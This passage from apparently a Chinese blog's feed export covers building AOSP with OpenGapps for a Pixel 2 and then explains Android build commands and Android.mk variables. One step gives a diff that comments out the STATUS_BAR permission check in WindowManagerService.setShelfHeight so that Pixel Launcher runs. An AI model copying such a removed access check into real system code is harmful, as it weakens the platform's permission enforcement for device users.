class="attr">name</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> <span class="attr">fetch</span>=<span class="string">&quot;https://gitlab.opengapps.org/opengapps/&quot;</span>  /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/build&quot;</span> <span class="attr">name</span>=<span class="string">&quot;aosp_build&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/all&quot;</span> <span class="attr">name</span>=<span class="string">&quot;all&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- arm64 depends on arm --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/arm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arm&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/arm64&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arm64&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/x86&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x86&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/x86_64&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x86_64&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-设置所需的OpenGapps变体"><a href="#2-设置所需的OpenGapps变体" class="headerlink" title="2. 设置所需的OpenGapps变体"></a>2. 设置所需的OpenGapps变体</h3><p>修改文件：<strong>device/google/muskie/aosp_walleye.mk</strong>，将：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_RESTRICT_VENDOR_FILES := owner</span><br></pre></td></tr></table></figure><p>该为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_RESTRICT_VENDOR_FILES := false</span><br></pre></td></tr></table></figure><p>否则在编译时会发生错误:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Error: Product &quot;aosp_walleye&quot; cannot have overlay in vendor tree:...</span><br></pre></td></tr></table></figure><p>再修改文件：<strong>device/google/wahoo/device.mk</strong>，在文件最后加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GAPPS_VARIANT := stock</span><br><span class="line">$(call inherit-product, vendor/opengapps/build/opengapps-packages.mk)</span><br></pre></td></tr></table></figure><p>编译AOSP时，就会相应vendor/opengapps/build/opengapps-packages.mk将Open Gapps编入system.img中</p><h3 id="3-修改原始代码"><a href="#3-修改原始代码" class="headerlink" title="3.修改原始代码"></a>3.修改原始代码</h3><p>修改<strong>frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--- a/services/core/java/com/android/server/wm/WindowManagerService.java</span><br><span class="line">+++ b/services/core/java/com/android/server/wm/WindowManagerService.java</span><br><span class="line">@@ -<span class="number">6001</span>,<span class="number">8</span> +<span class="number">6001</span>,<span class="number">8</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WindowManagerService</span> <span class="keyword">extends</span> <span class="title class_">IWindowManager</span>.Stub</span><br><span class="line"> </span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setShelfHeight</span><span class="params">(<span class="type">boolean</span> visible, <span class="type">int</span> shelfHeight)</span> &#123;</span><br><span class="line">-        mAmInternal.enforceCallerIsRecentsOrHasPermission(android.Manifest.permission.STATUS_BAR,</span><br><span class="line">-                <span class="string">&quot;setShelfHeight()&quot;</span>);</span><br><span class="line">+        <span class="comment">//mAmInternal.enforceCallerIsRecentsOrHasPermission(android.Manifest.permission.STATUS_BAR,</span></span><br><span class="line">+        <span class="comment">//        &quot;setShelfHeight()&quot;);</span></span><br><span class="line">         <span class="keyword">synchronized</span> (mWindowMap) &#123;</span><br><span class="line">             getDefaultDisplayContentLocked().getPinnedStackController().setAdjustedForShelf(visible,</span><br><span class="line">                     shelfHeight)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把setShelfHeight所需要的权限移除，否则刷入ROM之后Pixel Launcher会因权限不足发生错误。</p><h3 id="4-安装git-LFS并拉入所有依赖项"><a href="#4-安装git-LFS并拉入所有依赖项" class="headerlink" title="4.安装git LFS并拉入所有依赖项"></a>4.安装git LFS并拉入所有依赖项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-lfs</span><br><span class="line">git lfs install</span><br><span class="line">repo forall -c git lfs pull</span><br></pre></td></tr></table></figure><p>国内因为网络问题，建议将源换成Gitee，重新拉取代码<br>.repo\manifests\default.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;remote name=&quot;opengapps&quot; fetch=&quot;https://gitee.com/mirrors_opengapps&quot;  /&gt;</span><br><span class="line">&lt;remote name=&quot;opengapps-gitlab&quot; fetch=&quot;https://gitlab.opengapps.org/opengapps/&quot;  /&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/build&quot; name=&quot;aosp_build&quot; revision=&quot;master&quot; remote=&quot;opengapps&quot; /&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/sources/all&quot; name=&quot;all&quot; clone-depth=&quot;1&quot; revision=&quot;master&quot; remote=&quot;opengapps-gitlab&quot; /&gt;</span><br><span class="line">&lt;!-- arm64 depends on arm --&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/sources/arm&quot; name=&quot;arm&quot; clone-depth=&quot;1&quot; revision=&quot;master&quot; remote=&quot;opengapps-gitlab&quot; /&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/sources/arm64&quot; name=&quot;arm64&quot; clone-depth=&quot;1&quot; revision=&quot;master&quot; remote=&quot;opengapps-gitlab&quot; /&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/sources/x86&quot; name=&quot;x86&quot; clone-depth=&quot;1&quot; revision=&quot;master&quot; remote=&quot;opengapps-gitlab&quot; /&gt;</span><br><span class="line">&lt;project path=&quot;vendor/opengapps/sources/x86_64&quot; name=&quot;x86_64&quot; clone-depth=&quot;1&quot; revision=&quot;master&quot; remote=&quot;opengapps-gitlab&quot; /&gt;</span><br></pre></td></tr></table></figure><p>手动同步下，取决于你的网络，大约要下载20GB的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /vendor/opengapps/sources</span><br><span class="line">for d in ./*/ ; do (cd &quot;$d&quot; &amp;&amp; git lfs pull); done</span><br></pre></td></tr></table></figure><p>最后别忘了重新同步下仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo sync -c</span><br></pre></td></tr></table></figure><h3 id="5-重新编译及刷机"><a href="#5-重新编译及刷机" class="headerlink" title="5.重新编译及刷机"></a>5.重新编译及刷机</h3><p>再下make之后，重新刷机，结果如下：<br><img src="/images/20230827/202308271401005.jpg"></p><h2 id="六、可以会遇到的问题"><a href="#六、可以会遇到的问题" class="headerlink" title="六、可以会遇到的问题"></a>六、可以会遇到的问题</h2><p>问题：<br>__populate_fs: Could not allocate block in ext2 filesystem while writing file “libLLVM_android.so”<br>e2fsdroid: Could not allocate block in ext2 filesystem while populating file system<br>解决：<br>从提示的错误来看，应该是编译设置中分配给systemimage的镜像太小的问题<br>找到设置的文件：device/XXX/XXX_common/BoardConfig.mk,pixel2的路径为”\device\google\wahoo\BoardConfig.mk”<br>修改BOARD_SYSTEMIMAGE_PARTITION_SIZE := 2684354560为BOARD_SYSTEMIMAGE_PARTITION_SIZE := 4026531840</p><p>问题：<br>执行<strong>fastboot flashall -w</strong>时<br>Sending sparse ‘system_a’ 1/3 (519292 KB)          OKAY [ 45.361s]<br>Writing ‘system_a’                                 OKAY [  0.001s]<br>Sending sparse ‘system_a’ 2/3 (522280 KB)          FAILED (remote: ‘Error flashing partition.’)<br>fastboot: error: Command failed<br>解决：<br>刷机包不完整，仓库更新以后之后手动同步下repo sync仓库后全编再试</p><h2 id="附录：编译后各个镜像的功能介绍"><a href="#附录：编译后各个镜像的功能介绍" class="headerlink" title="附录：编译后各个镜像的功能介绍"></a>附录：编译后各个镜像的功能介绍</h2><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>ramdisk.img</td><td>ramdisk 为内存文件系统，是一个最小型文件系统， 在内核启动的时候会将其作为根文件系统进行挂，文件实际为 gzip 文件，可以直接解压</td></tr><tr><td>boot.img</td><td>boot.img 包含内 Linux 内核镜像 zImage 和根文件系统 ramdisk 文件,镜像基本构成为：头部，内核，ramdisk 镜像</td></tr><tr><td>dtbo.img</td><td>dtb overlay, 叠加 DT。由原始设计制造商 (ODM)/原始设备制造商 (OEM) 提供的设备专用配置</td></tr><tr><td>system.img</td><td>system 镜像会提供 android 所需要的命令，内置 app，运行动态库，以及系统配置文件， 在system-as-root特性中， system 镜像会被直接挂载成根目录下。</td></tr><tr><td>vendor.img/odm.img/oem.img/product.img</td><td>包含有厂商私有的可执行程序、库、系统服务和 app 等。可以将此分区看做是 system 分区的补充，厂商定制 ROM 的一些功能都可以放在此分区，odm 是贴牌厂商定制镜像， oem 是代工厂商定制镜像，</td></tr><tr><td>super.img</td><td>自 Android Q(10.0)以后，系统支持动态分区（dynamic partition），它将多个系统只读分区（包括 system、product、vendor、odm 或者其他厂商自定义分区）合并为一个 super 分区。物理分区只有 super 分区的概念，而没有 system等分区</td></tr><tr><td>userdata.img</td><td>用户存储空间。一般新买来的手机此分区几乎是空的，用户安装的 app 以及用户数据都是存放在此分区中。用户通过系统文件管理器访问到的手机存储（sdcard）即此分区的一部分，是通过 fuse 或 sdcardfs 这类用户态文件系统实现的一块特殊存储空间。</td></tr><tr><td>vbmeta.img</td><td>验证启动（Verified Boot）是 Android 4.4 开始引入的一个新的安全功能，作用是在系统启动时校验分区是否被篡改或者发生过改动，比如用户使用 root 软件强行植入 su 文件，但最后删除了 su， 这种情况也能检测出来。一旦检验不过，系统就不能正常启动，并且有相关的图文提示， 简单描述做法就是在启动过程中增加一条校验链，即 ROM code 校验 BootLoader，确保 BootLoader 的合法性和完整性，BootLoader 则需要校验 bootimage，确保 Kernel 启动所需 image 的合法性和完整性，而 Kernel 则负责校验 System 分区和 vendor 分区。</td></tr><tr><td>recovery.img</td><td>recovery 分区的镜像，一般用作系统恢复和升级，在 A/B 设备中，升级就不放在 recovery 中了。包含 recovery系统的 kernel 和 ramdisk。如果 bootloader 选择启动 recovery 模式，则会引导启动此分区的 kernel 并加载 ramdisk，并启动其中的 init 继而启动 recovery 程序，至此可以操作 recovery 模式功能（主要包括 OTA 升级、双清等）。boot.img 中 ramdisk 里 的 init.rc 位 于system/core/init/init.rc, 而 recovery.img 中 ramdisk 里 的 init.rc 位 于bootable/recovery/etc/init.rc</td></tr><tr><td>cache.img</td><td>主要用于缓存系统升级 OTA 包等。双清就是指对 userdata 分区和 cache 分区的清理。在 A/B 设备中，OTA 包就不需要存储在此。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android源码编译命令详解</title>
      <link href="/2023/08/26/2023-08-26/"/>
      <url>/2023/08/26/2023-08-26/</url>
      
        <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>先看下面几条指令，相信编译过Android源码的人都再熟悉不过的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source setenv.sh</span><br><span class="line">lunch</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>记得最初刚接触Android时，同事告诉我用上面的指令就可以编译Android源码，指令虽短但过几天就记不全或者忘记顺序，每次编译时还需要看看自己的云笔记，冰冷的指令总是难以让我记忆。后来我决定认真研究下这个指令的含义。知其然还需知其所以然，这样能更深层次的理解并记忆，才能与自身的知识体系建立强连接，或许还有意外收获，果然如此，接下来跟大家分享一下在研究上述几条指令含义的过程中，深入了解到的Android Build(编译)系统。</p><h2 id="二、编译命令"><a href="#二、编译命令" class="headerlink" title="二、编译命令"></a>二、编译命令</h2><p>准备好编译环境后，编译Android源码的第一步是 <strong>source build/envsetup.sh</strong>，其中source命令就是用于运行shell脚本命令，功能等价于”.”，因此该命令也等价于 <strong>. build/envsetup.sh</strong> 。在文件 <strong>envsetup.sh</strong> 声明了当前会话终端可用的命令，这里需要注意的是当前会话终端，也就意味着每次新打开一个终端都必须再一次执行这些指令。起初并不理解为什么新开的终端不能直接执行make指令，到这里总算明白了。</p><p>接下来，解释一下本文开头的引用的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source setenv.sh  //初始化编译环境，包括后面的lunch和make指令</span><br><span class="line">lunch  //指定此次编译的目标设备以及编译类型</span><br><span class="line">make  -j8 //开始编译，默认为编译整个系统，其中-j8代表的是编译的job数量为8。</span><br></pre></td></tr></table></figure><p>所有的编译命令都在<strong>envsetup.sh</strong>文件能找到相对应的function，比如上述的命令<strong>lunch</strong>，<strong>make</strong>，在文件一定能找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lunch</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>source envsetup.sh</strong>，需要cd到setenv.sh文件所在路径执行，路径可能在build/envsetup.sh，或者integrate/envsetup.sh，再或者不排除有些厂商会封装自己的.sh脚本，但核心思路是一致的。</p><p>具体实现这里就不展开说明，下面精炼地总结了一下各个指令用法和功效。</p><h3 id="2-1-代码编译"><a href="#2-1-代码编译" class="headerlink" title="2.1 代码编译"></a>2.1 代码编译</h3><table><thead><tr><th>编译指令</th><th>解释</th></tr></thead><tbody><tr><td>m</td><td>在源码树的根目录执行编译</td></tr><tr><td>mm</td><td>编译当前路径下所有模块，但不包含依赖</td></tr><tr><td>mmm [module_path]</td><td>编译指定路径下所有模块，但不包含依赖</td></tr><tr><td>mma</td><td>编译当前路径下所有模块，且包含依赖</td></tr><tr><td>mmma [module_path]</td><td>编译指定路径下所有模块，且包含依赖</td></tr><tr><td>make [module_name]</td><td>无参数，则表示编译整个Android代码</td></tr></tbody></table><p>下面列举部分模块的编译指令：</p><table><thead><tr><th>模块</th><th>make命令</th><th>mmm命令</th></tr></thead><tbody><tr><td>init</td><td>make init</td><td>mmm system/core/init</td></tr><tr><td>zygote</td><td>make app_process</td><td>mmm frameworks/base/cmds/app_process</td></tr><tr><td>system_server</td><td>make services</td><td>mmm frameworks/base/services</td></tr><tr><td>java framework</td><td>make framework</td><td>mmm frameworks/base</td></tr><tr><td>framework资源</td><td>make framework-res</td><td>mmm frameworks/base/core/res</td></tr><tr><td>jni framework</td><td>make libandroid_runtime</td><td>mmm frameworks/base/core/jni</td></tr><tr><td>binder</td><td>make libbinder</td><td>mmm frameworks/native/libs/binder</td></tr></tbody></table><p>上述mmm命令同样适用于mm/mma/mmma，编译系统采用的是增量编译，只会编译发生变化的目标文件。当需要重新编译所有的相关模块，则需要编译命令后增加参数 <strong>-B</strong>，比如make -B [module_name]，或者 mm -B [module_path]。</p><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h4><ul><li>对于<strong>m、mm、mmm、mma、mmma</strong>这些命令的实现都是通过<strong>make</strong>方式来完成的。</li><li>mmm/mm编译的效率很高，而make/mma/mmma编译较缓慢；</li><li>make/mma/mmma编译时会把所有的依赖模块一同编译，但mmm/mm不会;</li><li>建议：首次编译时采用make/mma/mmma编译；当依赖模块已经编译过的情况，则使用mmm/mm编译。</li></ul><h3 id="2-2-代码搜索"><a href="#2-2-代码搜索" class="headerlink" title="2.2 代码搜索"></a>2.2 代码搜索</h3><table><thead><tr><th>搜索指令</th><th>解释</th></tr></thead><tbody><tr><td>cgrep</td><td>所有 <strong>C/C++</strong> 文件执行搜索操作</td></tr><tr><td>jgrep</td><td>所有<strong>Java</strong>文件执行搜索操作</td></tr><tr><td>ggrep</td><td>所有<strong>Gradle</strong>文件执行搜索操作</td></tr><tr><td>mangrep [keyword]</td><td>所有<strong>AndroidManifest.xml</strong>文件执行搜索操作</td></tr><tr><td>mgrep [keyword]</td><td>所有<strong>Android.mk</strong>文件执行搜索操作</td></tr><tr><td>sepgrep [keyword]</td><td>所有<strong>sepolicy</strong>文件执行搜索操作</td></tr><tr><td>resgrep [keyword]</td><td>所有本地<strong>res/*.xml文</strong>件执行搜索操作</td></tr><tr><td>sgrep [keyword]</td><td>所有<strong>资源文件</strong>执行搜索操作</td></tr></tbody></table><p>上述指令用法最终实现方式都是基于<strong>grep</strong>指令，各个指令用法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xgrep [keyword]  //x代表的是上表的搜索指令</span><br></pre></td></tr></table></figure><p>例如，搜索所有AndroidManifest.xml文件中的<strong>launcher</strong>关键字所在文件的具体位置，指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mangrep launcher</span><br></pre></td></tr></table></figure><p>再如，搜索所有Java代码中包含zygote所在文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jgrep zygote</span><br></pre></td></tr></table></figure><p>又如，搜索所有system_app的selinux权限信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sepgrep system_app</span><br></pre></td></tr></table></figure><h4 id="Tips-Android源码非常庞大，直接采用grep来搜索代码，不仅方法笨拙、浪费时间，而且搜索出很多无意义的混淆结果。根据具体需求，来选择合适的代码搜索指令，能节省代码搜索时间，提高搜索结果的精准度，方便定位目标代码。"><a href="#Tips-Android源码非常庞大，直接采用grep来搜索代码，不仅方法笨拙、浪费时间，而且搜索出很多无意义的混淆结果。根据具体需求，来选择合适的代码搜索指令，能节省代码搜索时间，提高搜索结果的精准度，方便定位目标代码。" class="headerlink" title="Tips: Android源码非常庞大，直接采用grep来搜索代码，不仅方法笨拙、浪费时间，而且搜索出很多无意义的混淆结果。根据具体需求，来选择合适的代码搜索指令，能节省代码搜索时间，提高搜索结果的精准度，方便定位目标代码。"></a>Tips: Android源码非常庞大，直接采用grep来搜索代码，不仅方法笨拙、浪费时间，而且搜索出很多无意义的混淆结果。根据具体需求，来选择合适的代码搜索指令，能节省代码搜索时间，提高搜索结果的精准度，方便定位目标代码。</h4><h3 id="2-3-导航指令"><a href="#2-3-导航指令" class="headerlink" title="2.3 导航指令"></a>2.3 导航指令</h3><table><thead><tr><th>导航指令</th><th>解释</th></tr></thead><tbody><tr><td>croot</td><td>切换至Android根目录</td></tr><tr><td>cproj</td><td>切换至工程的根目录</td></tr><tr><td>godir [filename]</td><td>跳转到包含某个文件的目录</td></tr></tbody></table><h4 id="Tips-当每次修改完某个文件后需要编译时，执行cproj后会跳转到当前模块的根目录，也就是Android-mk文件所在目录，然后再执行mm指令，即可编译目标模块；当进入源码层级很深后，需要返回到根目录，使用croot一条指令完成；另外cd-指令可用于快速切换至上次目录。"><a href="#Tips-当每次修改完某个文件后需要编译时，执行cproj后会跳转到当前模块的根目录，也就是Android-mk文件所在目录，然后再执行mm指令，即可编译目标模块；当进入源码层级很深后，需要返回到根目录，使用croot一条指令完成；另外cd-指令可用于快速切换至上次目录。" class="headerlink" title="Tips: 当每次修改完某个文件后需要编译时，执行cproj后会跳转到当前模块的根目录，也就是Android.mk文件所在目录，然后再执行mm指令，即可编译目标模块；当进入源码层级很深后，需要返回到根目录，使用croot一条指令完成；另外cd - 指令可用于快速切换至上次目录。"></a>Tips: 当每次修改完某个文件后需要编译时，执行cproj后会跳转到当前模块的根目录，也就是Android.mk文件所在目录，然后再执行mm指令，即可编译目标模块；当进入源码层级很深后，需要返回到根目录，使用croot一条指令完成；另外cd - 指令可用于快速切换至上次目录。</h4><h3 id="2-4-信息查询"><a href="#2-4-信息查询" class="headerlink" title="2.4 信息查询"></a>2.4 信息查询</h3><table><thead><tr><th>查询指令</th><th>解释</th></tr></thead><tbody><tr><td>hmm</td><td>查询所有的指令help信息</td></tr><tr><td>findmakefile</td><td>查询当前目录所在工程的Android.mk文件路径</td></tr><tr><td>print_lunch_menu</td><td>查询lunch可选的product</td></tr><tr><td>printconfig</td><td>查询各项编译变量值</td></tr><tr><td>gettop</td><td>查询Android源码的根目录</td></tr><tr><td>gettargetarch</td><td>获取TARGET_ARCH值</td></tr></tbody></table><h3 id="2-5-其他指令"><a href="#2-5-其他指令" class="headerlink" title="2.5 其他指令"></a>2.5 其他指令</h3><p>上述只是列举比较常用的指令，还有其他指令，而且不同的build编译系统，支持的指令可能会存在一些差异，当忘记这些编译指令，可以通过执行<strong>hmm</strong>，查询指令的帮助信息。</p><p>最后再列举两个比较常用的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean：执行清理操作，等价于rm -rf out/</span><br><span class="line">make update-api：更新API，在framework API改动后需执行该指令，Api记录在目录frameworks/base/api</span><br></pre></td></tr></table></figure><h2 id="三、编译系统"><a href="#三、编译系统" class="headerlink" title="三、编译系统"></a>三、编译系统</h2><p>Android 编译系统是Android源码的一部分，用于编译Android系统，Android SDK以及相关文档。该编译系统是由Make文件、Shell以及Python脚本共同组成，其中最为重要的便是Make文件。</p><h3 id="3-1-Makefile分类"><a href="#3-1-Makefile分类" class="headerlink" title="3.1 Makefile分类"></a>3.1 Makefile分类</h3><p>整个Build系统的Make文件分为三大类：</p><ul><li><strong>系统核心的Make文件</strong>：定义了Build系统的框架，文件全部位于路径/<strong>build/core</strong>，其他Make文件都是基于该框架编写的；</li><li><strong>针对产品的Make文件</strong>：定义了具体某个型号手机的Make文件，文件路径位于 <strong>/device</strong> ，该目录下往往又以公司名和产品名划分两个子级目录，比如 <strong>/device/qcom/msm8916</strong> ；</li><li><strong>针对模块的Make文件</strong>：整个系统分为各个独立的模块，每个模块都一个专门的Make文件，名称统一为”Android.mk”，该文件定义了当前模块的编译方式。Build系统会扫描整个源码树中名为”Android.mk”的问题，并执行相应模块的编译工作。</li></ul><h3 id="3-2-编译产物"><a href="#3-2-编译产物" class="headerlink" title="3.2 编译产物"></a>3.2 编译产物</h3><p>经过<strong>make</strong>编译后的产物，都位于 <strong>/out目录</strong> ，该目录下主要关注下面几个目录：</p><ul><li>/out/host：Android开发工具的产物，包含SDK各种工具，比如adb，dex2oat，aapt等。</li><li>/out/target/common：通用的一些编译产物，包含Java应用代码和Java库；</li><li>/out/target/product/[product_name]：针对特定设备的编译产物以及平台相关C/C++代码和二进制文件；</li></ul><p>在/out/target/product/[product_name]目录下，有几个重量级的镜像文件：</p><ul><li>system.img:挂载为根分区，主要包含Android OS的系统文件；</li><li>ramdisk.img:主要包含init.rc文件和配置文件等；</li><li>userdata.img:被挂载在/data，主要包含用户以及应用程序相关的数据；</li></ul><p>当然还有boot.img，reocovery.img等镜像文件，这里就不介绍了。</p><h3 id="3-3-Android-mk解析"><a href="#3-3-Android-mk解析" class="headerlink" title="3.3 Android.mk解析"></a>3.3 Android.mk解析</h3><p>在源码树中每一个模块的所有文件通常都相应有一个自己的文件夹，在该模块的根目录下有一个名称为“Android.mk” 的文件。编译系统正是以模块为单位进行编译，每个模块都有唯一的模块名，一个模块可以有依赖多个其他模块，模块间的依赖关系就是通过模块名来引用的。也就是说当模块需要依赖一个jar包或者apk时，必须先将jar包或apk定义为一个模块，然后再依赖相应的模块。</p><p>对于Android.mk文件，通常都是以下面两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)  //设置当编译路径为当前文件夹所在路径</span><br><span class="line">include $(CLEAR_VARS)  //清空编译环境的变量（由其他模块设置过的变量）</span><br></pre></td></tr></table></figure><p>为方便模块编译，编译系统设置了很多的编译环境变量，如下：</p><ul><li>LOCAL_SRC_FILES：当前模块包含的所有源码文件；</li><li>LOCAL_MODULE：当前模块的名称（具有唯一性）；</li><li>LOCAL_PACKAGE_NAME：当前APK应用的名称（具有唯一性）；</li><li>LOCAL_C_INCLUDES：C/C++所需的头文件路径;</li><li>LOCAL_STATIC_LIBRARIES：当前模块在静态链接时需要的库名;</li><li>LOCAL_SHARED_LIBRARIES：当前模块在运行时依赖的动态库名;</li><li>LOCAL_STATIC_JAVA_LIBRARIES：当前模块依赖的Java静态库;</li><li>LOCAL_JAVA_LIBRARIES：当前模块依赖的Java共享库;</li><li>LOCAL_CERTIFICATE：签署当前应用的证书名称，比如platform。</li><li>LOCAL_MODULE_TAGS：当前模块所包含的标签，可以包含多标签，可能值为debgu,eng,user,development或optional（默认值）</li></ul><p>针对这些环境变量，编译系统还定义了一些便捷函数，如下：</p><ul><li>$(call my-dir)：获取当前文件夹路径；</li><li>$(call all-java-files-under, )：获取指定目录下的所有Java文件；</li><li>$(call all-c-files-under, )：获取指定目录下的所有C文件；</li><li>$(call all-Iaidl-files-under, ) ：获取指定目录下的所有AIDL文件；</li><li>$(call all-makefiles-under, )：获取指定目录下的所有Make文件；</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line"># 获取所有子目录中的Java文件</span><br><span class="line">LOCAL_SRC_FILES := $(call all-subdir-java-files)</span><br><span class="line"></span><br><span class="line"># 当前模块依赖的动态Java库名称</span><br><span class="line">LOCAL_JAVA_LIBRARIES := com.gityuan.lib</span><br><span class="line"></span><br><span class="line"># 当前模块的名称</span><br><span class="line">LOCAL_MODULE := demo</span><br><span class="line"></span><br><span class="line"># 将当前模块编译成一个静态的Java库</span><br><span class="line">include $(BUILD_STATIC_JAVA_LIBRARY)</span><br></pre></td></tr></table></figure><h2 id="四、附录：常用make命令"><a href="#四、附录：常用make命令" class="headerlink" 